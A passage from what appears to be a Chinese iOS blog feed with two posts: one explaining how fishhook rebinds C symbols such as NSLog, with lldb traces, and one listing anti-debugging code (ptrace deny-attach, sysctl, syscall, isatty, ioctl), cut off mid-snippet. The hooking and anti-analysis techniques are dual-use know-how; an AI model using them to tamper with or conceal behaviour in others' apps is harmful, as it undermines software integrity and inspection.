    <url>/2021/08/22/iOS%E4%B9%8Bfishhook/</url>
    
    <content type="html"><![CDATA[<h2 id="fishhook"><a href="#fishhook" class="headerlink" title="fishhook"></a>fishhook</h2><p><a href="https://github.com/facebook/fishhook">fishHook</a>是Facebook提供的一个动态修改链接mach-O文件的工具。利用MachO文件加载原理，通过重新绑定(rebind_symbols)懒加载表(Lazy Symbol Pointers)和非懒加载表(Non-Lazy Symbol Pointers)这两个表的指针达到C函数HOOK的目的。</p><blockquote><p>dyld加载macho文件和系统框架,对函数地址复制的过程，成为 <strong>“符号绑定“</strong></p></blockquote><h2 id="调试分析fishHook"><a href="#调试分析fishHook" class="headerlink" title="调试分析fishHook"></a>调试分析fishHook</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">//</span><br><span class="hljs-comment">//  ViewController.m</span><br><span class="hljs-comment">//  fishhook</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//  Created by Cola on 2020/5/24.</span><br><span class="hljs-comment">//  Copyright © 2020 Cola. All rights reserved.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;ViewController.h&quot;</span></span><br><span class="hljs-meta">#import <span class="hljs-meta-string">&quot;fishhook.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">ViewController</span> ()</span><br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">ViewController</span></span><br><br>- (<span class="hljs-keyword">void</span>)viewDidLoad &#123;<br>    [<span class="hljs-keyword">super</span> viewDidLoad];<br>   <br>    <span class="hljs-comment">//一个rebinding hook一个函数,想要hook多个函数，可以将rebinding添加至数组</span><br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;1&quot;</span>);<br>    <span class="hljs-comment">//更改系统的NSLoga函数</span><br>    <span class="hljs-keyword">struct</span> rebinding nslog;<br>    nslog.name = <span class="hljs-string">&quot;NSLog&quot;</span>;<br>    nslog.replacement = myNSLog;<br>    nslog.replaced = &amp;sys_nslog;<br>    <br>    <span class="hljs-keyword">struct</span> rebinding rebs[<span class="hljs-number">1</span>] = &#123;nslog&#125;;<br>    <br>    <br>    rebind_symbols(rebs, <span class="hljs-number">1</span>);<br>     <br>&#125;<br><br>- (<span class="hljs-keyword">void</span>)touchesBegan:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event&#123;<br> <br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;点击&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//函数指针</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> (*sys_nslog)(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...);<br> <br><span class="hljs-comment">//定义一个新的函数</span><br><span class="hljs-keyword">void</span> myNSLog(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...)&#123;<br>    format = [format stringByAppendingFormat:<span class="hljs-string">@&quot;\n HOOK成功🐂&quot;</span>];<br>    sys_nslog(format);<br>&#125;<br><br><span class="hljs-keyword">@end</span><br></code></pre></td></tr></table></figure><ol><li><p>通过machoView查看符号表(Lazy Symbol Pointers)的偏移量(比如NSLog的偏移量是) 0x00005000</p></li><li><p>在<code>rebind_symbols(rebs, 1);</code>下断点,</p></li><li><p>通过image list查看加载的macho文件和所有的框架</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">(lldb) image list<br>[  <span class="hljs-number">0</span>] E10158F5-<span class="hljs-number">413</span>E-<span class="hljs-number">35</span>E1-A349-<span class="hljs-number">8</span>AFA71FFC955 <span class="hljs-number">0</span>x0000000103db1000 <span class="hljs-regexp">/Users/</span>cola<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/Xcode/</span>DerivedData<span class="hljs-regexp">/fishhook-dduxiymrdkidvtcxqmuqqwanbexr/</span>Build<span class="hljs-regexp">/Products/</span>Debug-iphonesimulator<span class="hljs-regexp">/fishhook.app/</span>fishhook <br>[  <span class="hljs-number">1</span>] EEA931D0-<span class="hljs-number">403</span>E-<span class="hljs-number">3</span>BC8-<span class="hljs-number">862</span>A-CBA037DE4A74 <span class="hljs-number">0</span>x00000001048e3000 <span class="hljs-regexp">/usr/</span>lib/dyld <br>[  <span class="hljs-number">2</span>] <span class="hljs-number">75369</span>F31-<span class="hljs-number">702</span>D-<span class="hljs-number">364</span>A-<span class="hljs-number">95</span>C3-<span class="hljs-number">8</span>AFA9DD4B3A2 <span class="hljs-number">0</span>x0000000103dbf000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>dyld_sim <br>[  <span class="hljs-number">3</span>] <span class="hljs-number">56</span>E47800-<span class="hljs-number">2</span>CCB-<span class="hljs-number">3</span>B7D-B94B-CCF5F13D6BCF <span class="hljs-number">0</span>x00007fff256b8000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/</span>System<span class="hljs-regexp">/Library/</span>Frameworks<span class="hljs-regexp">/Foundation.framework/</span>Foundation <br>[  <span class="hljs-number">4</span>] <span class="hljs-number">3</span>EC683F6-<span class="hljs-number">36</span>EF-<span class="hljs-number">33</span>E1-<span class="hljs-number">8</span>B98-C95E12BA38D2 <span class="hljs-number">0</span>x00007fff513f6000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>libobjc.A.dylib <br>[  <span class="hljs-number">5</span>] <span class="hljs-number">7881</span>AD7F-<span class="hljs-number">524</span>C-<span class="hljs-number">3</span>CFA-<span class="hljs-number">9595</span>-<span class="hljs-number">02</span>ED549166AA <span class="hljs-number">0</span>x00007fff4ff15000 <span class="hljs-regexp">/Applications/</span>Xcode.app<span class="hljs-regexp">/Contents/</span>Developer<span class="hljs-regexp">/Platforms/i</span>PhoneOS.platform<span class="hljs-regexp">/Library/</span>Developer<span class="hljs-regexp">/CoreSimulator/</span>Profiles<span class="hljs-regexp">/Runtimes/i</span>OS.simruntime<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/RuntimeRoot/u</span>sr<span class="hljs-regexp">/lib/</span>libSystem.B.dylib <br><br>.......<br></code></pre></td></tr></table></figure></li><li><p>macho文件的首地址+第一步的偏移量，就是NSLog的真实地址,读NSLog的符号表地址</p><p>memory read  简写   x 0x0000000103db1000+0x00005000</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(lldb) memory read 0x0000000103db1000+0x00005000<br>0x103db6000: fa 2d<span class="hljs-number"> 76 </span>25 ff 7f<span class="hljs-number"> 00 </span>00 f8 d1<span class="hljs-number"> 74 </span>25 ff 7f<span class="hljs-number"> 00 </span>00  .-v%......t%....<br>0x103db6010: f8<span class="hljs-number"> 26 </span>09<span class="hljs-number"> 48 </span>ff 7f<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 44 </span>34 db<span class="hljs-number"> 03 </span>01<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> .&amp;.H....D4......<br></code></pre></td></tr></table></figure></li><li><p>其中前八个字节为NSLog的地址<br>查看4中的前八个字节的地址的汇编代码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(lldb) dis -s <span class="hljs-number">0x7fff25762dfa</span><br>Foundation`NSLog:<br>    <span class="hljs-number">0x7fff25762dfa</span> &lt;+<span class="hljs-number">0</span>&gt;:  pushq  <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x7fff25762dfb</span> &lt;+<span class="hljs-number">1</span>&gt;:  movq   <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x7fff25762dfe</span> &lt;+<span class="hljs-number">4</span>&gt;:  subq   $<span class="hljs-number">0xd0</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsp</span><br>    <span class="hljs-number">0x7fff25762e05</span> &lt;+<span class="hljs-number">11</span>&gt;: testb  <span class="hljs-variable">%al</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%al</span><br>    <span class="hljs-number">0x7fff25762e07</span> &lt;+<span class="hljs-number">13</span>&gt;: je     <span class="hljs-number">0x7fff25762e2f</span>            <span class="hljs-comment">; &lt;+53&gt;</span><br>    <span class="hljs-number">0x7fff25762e09</span> &lt;+<span class="hljs-number">15</span>&gt;: movaps <span class="hljs-variable">%xmm0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span>xa<span class="hljs-number">0</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x7fff25762e10</span> &lt;+<span class="hljs-number">22</span>&gt;: movaps <span class="hljs-variable">%xmm1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">90</span>(<span class="hljs-variable">%rbp</span>)<br></code></pre></td></tr></table></figure><p>从中可以看见NSLog的地址</p></li><li><p>单步执行，执行fishhook的rebind_symbols方法后查看NSLog的真实地址</p><p>和4相比地址已经改变</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(lldb) memory read 0x000000010f550000+0x00005000<br>0x10f555000:<span class="hljs-number"> 50 </span>14<span class="hljs-number"> 55 </span>0f<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00 f8 d1<span class="hljs-number"> 74 </span>25 ff 7f<span class="hljs-number"> 00 </span>00  P.U.......t%....<br>0x10f555010: f8<span class="hljs-number"> 26 </span>09<span class="hljs-number"> 48 </span>ff 7f<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 54 </span>99<span class="hljs-number"> 34 </span>52 ff 7f<span class="hljs-number"> 00 </span>00  .&amp;.H....T.4R....<br></code></pre></td></tr></table></figure></li><li><p>查看前八个字节对应地址的汇编代码，发现已经被替换成我们的myNSlog方法</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(lldb) dis -s <span class="hljs-number">010</span>f<span class="hljs-number">551450</span><br>fishhook`myNSLog:<br>    <span class="hljs-number">0x10f551450</span> &lt;+<span class="hljs-number">0</span>&gt;:  pushq  <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x10f551451</span> &lt;+<span class="hljs-number">1</span>&gt;:  movq   <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rbp</span><br>    <span class="hljs-number">0x10f551454</span> &lt;+<span class="hljs-number">4</span>&gt;:  subq   $<span class="hljs-number">0x30</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsp</span><br>    <span class="hljs-number">0x10f551458</span> &lt;+<span class="hljs-number">8</span>&gt;:  movq   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x10f551460</span> &lt;+<span class="hljs-number">16</span>&gt;: leaq   <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%rbp</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>    <span class="hljs-number">0x10f551464</span> &lt;+<span class="hljs-number">20</span>&gt;: movq   <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>(<span class="hljs-variable">%rbp</span>)<br>    <span class="hljs-number">0x10f551468</span> &lt;+<span class="hljs-number">24</span>&gt;: movq   <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span><br>    <span class="hljs-number">0x10f55146b</span> &lt;+<span class="hljs-number">27</span>&gt;: movq   <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>(<span class="hljs-variable">%rbp</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rsi</span><br>(lldb) <br></code></pre></td></tr></table></figure></li><li><p>调用原方法</p><p>因为系统默认绑定的地址被保存到了，自定义的变量中，可以通过地址调用该方法。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">//函数指针</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> (*sys_nslog)(<span class="hljs-built_in">NSString</span> * _Nonnull format, ...);<br></code></pre></td></tr></table></figure><p>调用原方法</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">//定义一个新的函数</span><br>void myNSLog(NSString * <span class="hljs-variable">_Nonnull</span> <span class="hljs-built_in">format</span>, ...)&#123;<br>    <span class="hljs-built_in">format</span> = [<span class="hljs-built_in">format</span> stringByAppendingFormat:@<span class="hljs-string">&quot;\n HOOK成功🐂&quot;</span>];<br>    sys_nslog(<span class="hljs-built_in">format</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="fishHOOK原理"><a href="#fishHOOK原理" class="headerlink" title="fishHOOK原理"></a>fishHOOK原理</h2><p><strong>重新绑定符号表</strong></p><p>懒加载符号表与indirect symbols表一一对应</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/%E6%87%92%E5%8A%A0%E8%BD%BD%E7%AC%A6%E5%8F%B7%E8%A1%A8.png" class=""><p>indirect symbols表中NSLog的Data值为A6</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/indirectsymbols%E8%A1%A8.png" class=""><p>A6转为10进制为166,其中166对应着Symbols Table下的Symbols</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/Symbols.png" class=""><p>其中 #166在String Table Index表的偏移为D7，符号表基址为83AC，NSLog的地址为 83AC+D7=8483</p> <img src="/2021/08/22/iOS%E4%B9%8Bfishhook/images/StringTable.png" class=""><p>而fishHook则是逆过程，通过String Table表NSLog的地址，找到Lazy Symbols Pointers(懒加载符号表)中的NSLog符号表地址，获取懒加载符号表的偏移.</p><h2 id="fishHOOK能做什么"><a href="#fishHOOK能做什么" class="headerlink" title="fishHOOK能做什么"></a>fishHOOK能做什么</h2><ol><li><p>应用安全防护：</p><p> 将系统敏感函数，真实地址保存，并将该方法设置为宏定义,以后使用宏定义设置的方法，别人就无法HOOK该方法了，因为你使用的是函数的真实地址，并不是调用符号表中的函数地址，这样别人修改符号表是不影响程序的。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><p> 三方框架有可能会用到该函数，如果fishhook加载的过早会导致三方框架失效。</p></li></ol><ol start="2"><li><p>启动优化、埋点、AOP</p><ul><li>定位所有方法的调用，hook objc_msgSend函数?</li><li>二进制重排(layout)的目的在于将hot code聚合在一起，即使得最经常执行的代码或最需要关键执行的代码（如启动阶段的顺序调用）聚合在一起，形成一个更紧凑的__TEXT段。</li></ul></li></ol><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>fishhook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之反调试</title>
    <link href="/2021/08/22/iOS%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <url>/2021/08/22/iOS%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="ptrace-反调"><a href="#ptrace-反调" class="headerlink" title="ptrace 反调"></a>ptrace 反调</h2><p>ptrace反调试，阻止LLDB附加调试</p><p>在Unix 系统中，提供了一个系统调用 ptrace 用于实现断点调试和对进程进行跟踪和控制，而 PT_DENY_ATTACH 是苹果增加的一个 ptrace 选项，这个参数用来告诉系统，阻止调试器依附，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案,代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;dlfcn.h&gt;<br><br>#import &lt;sys/types.h&gt;<br><br>typedef int (*ptrace_ptr_t)(int _request, pid_t pid, caddr_t _addr, int _data);<br><br>#if !defined(PT_DENT_ATTACH)<br><br>#define PT_DENT_ATTACH 31<br><br>#endif<br><br>void disable_debug() &#123;<br><br>        void * handle = dlopen(0, RTLD_GLOBAL|RTLD_NOW);<br>    <br>        ptrace_ptr_t ptrace_ptr = dlsym(handle, &quot;ptrace&quot;);<br>    <br>        ptrace_ptr(PT_DENT_ATTACH, 0, 0, 0);<br>    <br>        dlclose(handle);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="sysctl反调试"><a href="#sysctl反调试" class="headerlink" title="sysctl反调试"></a>sysctl反调试</h2><p>当一个进程被调试的时候，该进程会有一个标记来标记自己正在被调试，所以可以通过sysctl去查看当前进程的信息，看有没有这个标记位即可检查当前调试状态。</p><p>函数介绍</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">函数的返回值若为<span class="hljs-number">0</span>时，证明没有错误，其他数字为错误码。<br><br>arg1 传入一个数组，该数组中的第一个元素指定本请求定向到内核的哪个子系统。第二个及其后元素依次细化指定该系统的某个部分。<br><br>arg2 数组中的元素数目<br><br>arg3 一个结构体，指向一个供内核存放该值的缓冲区，存放进程查询结果<br><br>arg4 缓冲区的大小<br><br>arg5/arg6 为了设置某个新值，arg5参数指向一个大小为arg6参数值的缓冲区。如果不准备指定一个新值，那么arg5应为一个空指针，arg6因为<span class="hljs-number">0.</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *, u_int, <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">size_t</span> *, <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">size_t</span>)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs objective-c"><br>#import &lt;sys/sysctl.h&gt;<br><br>#import &lt;sys/types.h&gt;<br><br>#import &lt;unistd.h&gt;<br><br>static bool is_debugger_present(void) &#123;<br><br>    int name[4];//存放字节码，查询信息<br><br>    struct kinfo_proc info;//接受进程查询结果信息的结构体<br><br>    size_t info_size = sizeof(info);//结构体的大小<br><br>    info.kp_proc.p_flag = 0;<br><br>    name[0] = CTL_KERN;//内核查看<br><br>    name[1] = KERN_PROC;//进程查看<br><br>    name[2] = KERN_PROC_PID;//进程ID<br><br>    name[3] = getpid();//获取pid<br><br>    int proc_err = sysctl(name, 4, &amp;info, &amp;info_size, NULL, 0);<br><br>    if (proc_err == -1) &#123; //判断是否出现了异常<br><br>        exit(-1);<br><br>    &#125;<br><br>    //info.kp_proc.p_flag中存放的是标志位（二进制），在proc.h文件中有p_flag的宏定义，通过&amp;运算可知对应标志位的值是否为0。（若结果值为0则对应标志位为0）。其中P_TRACED为正在跟踪调试过程。<br><br>    return ((info.kp_proc.p_flag &amp; P_TRACED) != 0);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="syscall反调"><a href="#syscall反调" class="headerlink" title="syscall反调"></a>syscall反调</h2><p>直接调用这个函数:</p><p>其中PT_DENT_ATTACH的值为31，直接填31即可。SYS_ptrace的值为26，可以引入&lt;sys/syscall.h&gt;头文件后直接调用宏定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;sys/syscall.h&gt;<br><br>syscall(SYS_ptrace,PT_DENT_ATTACH,0,0,0);<br></code></pre></td></tr></table></figure><p>为从实现从用户态切换到内核态，系统提供了一个系统调用函数syscall，上面讲到的ptrace也是通过系统调用去实现的。而ptrace的编号为26，也就是SYS_ptrace的值:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">26</span>. ptrace               <span class="hljs-number">801</span>e<span class="hljs-number">812</span>c T<br></code></pre></td></tr></table></figure><p>其他函数编号可以在这里Kernel Syscalls查阅</p><p>但是syscall在iOS10之后废弃了。代替它的函数在</p><p>&lt;sys/kdebug_signpost.h&gt;里，叫kdebug_signpost()</p><h2 id="SIGSTOP-当检测到有断点触发时停止调试"><a href="#SIGSTOP-当检测到有断点触发时停止调试" class="headerlink" title="SIGSTOP(当检测到有断点触发时停止调试))"></a>SIGSTOP(当检测到有断点触发时停止调试))</h2><p>通过捕获系统SIGSTOP信号来判断。</p><p>如果程序没有断点。那这个是没有用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">dispatch_source_t source = dispatch_source_create(DISPATCH_SOURCE_TYPE_SIGNAL, SIGSTOP, 0, dispatch_get_main_queue());<br><br>    dispatch_source_set_event_handler(source, ^&#123;<br><br>        exit(0);<br><br>    &#125;);<br><br>    dispatch_resume(source);<br>isatty<br><br>isatty方法也可以用来检测是否正在被调试<br><br>#import &lt;unistd.h&gt;<br><br>if (isatty(1)) &#123;<br><br>   exit(0);   <br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="isatty"><a href="#isatty" class="headerlink" title="isatty"></a>isatty</h2><p>isatty方法也可以用来检测是否正在被调试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#import &lt;unistd.h&gt;</span><br><span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">1</span>)) &#123;<br>   <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);   <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">#import &lt;sys/ioctl.h&gt;<br>void Anti_ioctl() &#123;<br>    if (!ioctl(1, TIOCGWINSZ)) &#123;<br>        exit(1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是，上述这些方式只能简单地防止 App 被动态调试，其实 ptrace、sysctl、syscall 等函数本身也可以被静态修改或 Hook。而且即便能有效阻止了调试，App 仍然可以通过 tweak 去 Hook App 内部的方法实现，也可以通过 dylib 注入去修改 App 的功能</p><p>我们只好从多方面考虑，尽可能提高安全性，比如防止 tweak 依附、防止网络请求抓包、对敏感数据进行加解密、代码混淆、检查二进制 binary 签名是否匹配；关键逻辑用更底层的 C 函数实现（虽然 C 函数也是可以被 Hook，例如 Facebook 开源的 fishhook），等等，同时我们也可以检查手机是否已经越狱，并对越狱机做特殊处理。</p><h2 id="内联-svc-ptrace-实现和内联-svc-syscall-ptrace-实现"><a href="#内联-svc-ptrace-实现和内联-svc-syscall-ptrace-实现" class="headerlink" title="内联 svc + ptrace 实现和内联 svc + syscall + ptrace 实现"></a>内联 svc + ptrace 实现和内联 svc + syscall + ptrace 实现</h2><p> 其实这两种方法都等同于直接或间接使用 ptrace, 此时系统调用号是 SYS_ptrace</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 